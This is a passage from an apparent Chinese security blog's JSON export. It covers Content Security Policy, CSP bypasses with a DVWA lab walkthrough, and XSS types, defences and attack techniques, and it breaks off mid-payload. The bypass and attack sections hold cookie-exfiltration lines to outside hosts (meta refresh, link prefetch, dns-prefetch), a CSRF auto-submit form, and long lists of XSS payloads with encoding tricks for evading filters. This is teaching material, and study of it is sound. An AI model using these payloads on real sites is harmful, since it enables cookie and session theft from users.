&lt;audio&gt;、&lt;video&gt; 等引用资源加载策略 object-src 定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略 script-src 定义 JS 加载策略 style-src 定义 CSS 加载策略 sandbox 值为 allow-forms，对资源启用 sandbox report-uri 值为 /report-uri，提交日志 内容源 源 说明 * 通配符，允许任何URL，除了data: blob: filesystem: schemes *.foo.com 允许加载foo.com子域的资源 abc.foo.com 只能加载这个域名下的资源 https://a.com 只能用HTTPS加载域名下的资源 https: 通过HTTPS可以加载任意域名下的资源 ‘none’ 代表空集,即不匹配任何URL,两侧单引号是必须的 ‘self’ 代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的 ‘unsafe-inline’ 允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的 ‘unsafe-eval’ 允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的 data: 允许data: URI作为内容来源 mediastream: 允许mediastream: URI作为内容来源 例子1Content-Security-Policy: default-src &#39;self&#39; steady.foo.com 默认的内容源必须为同源或者是steady.foo.com nonce script CSP和strict-dynamicnonce script CSP1234&lt;?phpHeader(&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;.$random.&quot; &#x27;&quot;);?&gt;&lt;script nonce=&quot;&lt;?php echo $random?&gt;&quot;&gt; 这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。 strict-dynamic1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;strict-dynamic&#39; CSP Bypass的方法总结CSP对前端攻击的防御主要有两个： 限制js的执行。 限制对不可信域的请求。 绕过方式url跳转在default-src ‘none‘的情况下，可以使用meta标签实现跳转 1&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt; 在允许unsafe-inline的情况下 用window.location，或者window.open之类的方法进行跳转绕过 123&lt;script&gt; window.location&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;;&lt;&#x2F;script&gt; &lt;a&gt;标签配合站内的某些可控JS点击操作来跳转 1234&lt;script&gt; $(#foo).click()&lt;&#x2F;script&gt;&lt;a id&#x3D;&quot;foo&quot; href&#x3D;&quot;xxxxx.com&quot;&gt; 利用网站本身的跳转接口 1http:&#x2F;&#x2F;foo.com&#x2F;jmp.php?url&#x3D;attack.com &lt;link&gt;标签预加载CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据。 1&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt; 在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie 1&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt; 利用浏览器补全有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样 1Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39; 插入点 12&lt;p&gt;插入点&lt;&#x2F;p&gt;&lt;script nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt; payload 1&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot; 浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定 12&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;&lt;&#x2F;p&gt;&lt;script&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt; DVWA-CSP靶场src属性1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;myscripts.js&quot;&gt;&lt;&#x2F;script&gt; src 属性规定外部脚本文件的 URL。 有时，我们需要在网站的多个页面中运行 JavaScript。不需要重复编写相同的脚本，只需在单独的文件中创建 JavaScript，并以 .js 为后缀保存，然后使用&lt;script&gt; 标签中的 src 属性引用该文件即可。 注释：外部文件不能包含 &lt;script&gt; 标签！ Low源码分析 123456789101112131415161718192021222324252627&lt;?php//定义script脚本执行策略，可以看到只允许本域、以及一下网站https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.//设置CSP头header($headerCSP);# These might work if you can&#x27;t create your own for some reason# https://pastebin.com/raw/R570EE00# https://hastebin.com/raw/ohulaquzex?&gt;&lt;?php//接受include参数if (isset ($_POST[&#x27;include&#x27;])) &#123;//拼接参数$page[ &#x27;body&#x27; ] .= &quot; &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#x27;; 构造payload 1https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;jWN8HLKe https://pastebin.com是一个快速文本分享网站，我们可以插入我们的xss代码。 配合CSRF，诱惑用户自动触发漏洞。 123456789101112131415&lt;form id=&quot;csp&quot; name=&quot;csp&quot; method=&quot;POST&quot; action=&quot;http://192.168.1.200/DVWA-master/vulnerabilities/csp/&quot;&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot;&gt; &lt;script&gt; var cspb = document.getElementById(&quot;csp&quot;); cspb[0].value=&quot;https://pastebin.com/raw/rcBeKDgL&quot;; cspb.submit(); &lt;/script&gt; &lt;/form&gt; Medium源码 12345678910111213141516171819202122232425&lt;?php//js脚本只允许本域、允许使用内联资源、而且设置了nonce属性$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;header($headerCSP);// Disable XSS protections so that inline alert boxes will workheader (&quot;X-XSS-Protection: 0&quot;);# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#x27;; 构造payload 可以加载本地的script并且需要nonce值。 1&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt; High源码 1234567891011121314151617181920212223&lt;?php//只能加载本地的script$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;header($headerCSP);?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt;&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;&#x27;; 分析../..//vulnerabilities/csp/source/jsonp.php 1234567891011121314&lt;?phpheader(&quot;Content-Type: application&#x2F;json; charset&#x3D;UTF-8&quot;);if (array_key_exists (&quot;callback&quot;, $_GET)) &#123; $callback &#x3D; $_GET[&#39;callback&#39;];&#125; else &#123; return &quot;&quot;;&#125;$outp &#x3D; array (&quot;answer&quot; &#x3D;&gt; &quot;15&quot;);echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;?&gt; high.js文件 1234567891011121314151617181920//创建&lt;script&gt;标签，并添加src属性source/jsonp.php?callback=solveSum，其中solveSum是一个函数，用来添加anser的值。function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s);&#125;//添加代码之后，会将answer的值打印出来，这里如果我们将callback的值修改为文本的值也会打印出来。function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);//点击按钮之后会触发clickButton函数，该函数会添加前端代码。if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125; 构造payload–直接赋予callback值payload 1include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt; Impossible1234567891011121314151617181920212223&lt;?php$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;header($headerCSP);?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt;&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;&#x27;; Impossible.js 1234567891011121314151617181920//添加script代码function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp_impossible.php&quot;; document.body.appendChild(s);&#125;function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125; source/jsonp_impossible.php 12345678//这里没有参数值接受参数也就无法输出js代码。&lt;?phpheader(&quot;Content-Type: application/json; charset=UTF-8&quot;);$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);echo &quot;solveSum (&quot;.json_encode($outp).&quot;)&quot;;?&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"xss漏洞","slug":"xss","date":"2018-12-26T02:46:40.000Z","updated":"2020-10-16T11:57:22.356Z","comments":true,"path":"2018/12/26/xss/","link":"","permalink":"http://s1eady.top/2018/12/26/xss/","excerpt":"","text":"xss原理攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 危害 窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。 监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。 更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。 分类反射型xss原理只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码 常见漏洞位置网站搜索框、用户登录入口、注入表单的地方。 存储型xss原理可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。 常见漏洞位置论坛、博客等留言位置、评论位置。 DOM型XSS原理 DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。 攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。 比如： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM XSS&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;script&gt; var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 获取输入函数 document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname 输出函数 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) document.write(…) document.writeln(…) element.innerHTML(…) document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname) 总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 业务逻辑1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框 2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等 xss大多出现在输入框中 3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方 防御思路存储xss和反射xss1、纯前端渲染，把代码和数据分隔开。 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。 2、直接使用html实体转义函数,比如php函数htmlspecialchars（）和htmlentities()、escapeHTML 1234567字符 转义后的字符&amp; &amp;&lt; &lt;&gt; &gt;&quot; &quot;&#39; &amp;#x27;&#x2F; &#x2F; 不能仅仅靠实体转义函数来防御xss，像javascript:alert(&amp;#x27;XSS&amp;#x27;)这种类型的攻击，实体转义函数就不会对其起作用。 而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。 但是我们可以使用escapeEmbedJSON() 函数，对内联 JSON 进行转义。 字符 转义后的字符 U+2028 \\u2028 U+2029 \\u2029 &lt; \\u003c 应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。 XSS 安全漏洞 简单转义是否有防护作用 HTML 标签文字内容 有 HTML 属性值 有 CSS 内联样式 无 内联 JavaScript 无 内联 JSON 无 跳转链接 无 DOM型xss在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。 其他思路1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的； 禁止向第三方域提交数据，这样用户数据也不会外泄； 2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。 3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。 5、数据插入数据、取出数据库都不转义,在视图文件中进行转义 1&lt;div class=&quot;comment-content&quot;&gt;&lt;?php echo htmlspecialchars($comment[&#x27;content&#x27;];) ?&gt;&lt;/div&gt; 总结1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。 2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。 3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。 攻击思路1、如果前端限制,尝试burp抓包改包 123456# XSS-Payloadhttps://github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayloadhttps://github.com/ZephrFish/XSSPayloads/blob/master/raw_payloadshttps://github.com/silience/xsspayloadhttps://github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txthttps://github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt 2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试 3、手工测试常见标签 &lt;img&gt;标签 利用方式1 12345678&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;&lt;!--CSS标记xss--&gt;&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt; &lt;a&gt;标签 标准格式 1&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt; 方式1 123456&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt; input标签 标准格式 1&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt; XSS利用方式1 123&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt; &lt;form&gt;标签 XSS利用方式1 123456789&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;&lt;!--原code--&gt;&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt; &lt;iframe&gt;标签 XSS利用方式1 12345678&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;&lt;!--原code--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt; svg&lt;&gt;标签 1&lt;svg onload&#x3D;alert(1)&gt; 绕过思路绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。 1、过滤关键字 大小写绕过、大小写混合 1&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt; 嵌套,也就是重复 1&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; 代替 iframe就可以代替scriptconfirm和prompt可以代替alert 12345678910&lt;iframe onload=alert(1)&gt;&lt;marquee/onstart=confirm(1)&gt;&lt;details/open/ontoggle=top[&quot;al&quot;+&quot;ert&quot;](1)&gt; 谷歌浏览器 【绕阿里云XSS】&lt;svg/onload=prompt(1)&gt;&lt;style onload=alert(1)&gt;&lt;iframe src=javascript:alert`1`&gt;&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;script&gt;confirm(&#x27;XSS&#x27;)&lt;/script&gt;&lt;script&gt;prompt(&#x27;XSS&#x27;)&lt;/script&gt; HTML5 新增的实体命名编码 12345&amp;colon; =&gt; [冒号]&amp;NewLine; =&gt; [换行]case: &lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;/a&gt; 编码 HTML实体可以使用十进制与十六进制编码; javascript可以使用Unicode与八进制与十六进制进行编码. eval()函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站http://web.chacuo.net/charsetjsascii 将payload进行进制转化,十六进制前面+&amp;#x,十进制+&amp;# 对于JS编码 unicode配合js的eval函数 12 &lt;img src=&quot;1&quot; onerror=eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;)&gt;&lt;/img&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0027\\u0029&quot;)&gt;&lt;/img&gt; 八进制与十六进制编码 1&lt;script&gt;eval(&quot;\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51&quot;);&lt;/script&gt;（JS八进制编码） eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\");（JS十六进制编码） 12345- String.fromCharCode &#96;&#96;&#96;csharp&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt; data协议 1 1&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt; 对html编码 十进制与十六进制 12&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; （HTML实体十进制编码)&lt;img src=1 onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt; (HTML实体十六进制编码) 1234567891011**js特性**| Payload | 效果 || ------------------------------------------------ | ---------------------- || &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96; | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; || &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96; | &#96;alert(1)&#96; || &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\\w&#123;4&#125;\\(\\d\\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96; |​&#96;&#96;&#96;csharp&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt; 2、过滤符号 过滤空格 用/**/或者/12&lt;img/src=&quot;1&quot;/onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt;&lt;img/**/src=&quot;1&quot;/**/onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt; 3、常用函数 atob()与btoa() 1234atob(&quot;L2h0dHA6Lw==&quot;)&quot;/http:/&quot;btoa(/http:/)&quot;L2h0dHA6Lw==&quot; 在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串： atob() //ASCII to Base64 btoa() //Base64 to ASCII slice() slice() 方法可从已有的数组中返回选定的元素 1arrayObject.slice(start,end) 1atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1)))) 1&lt;svg 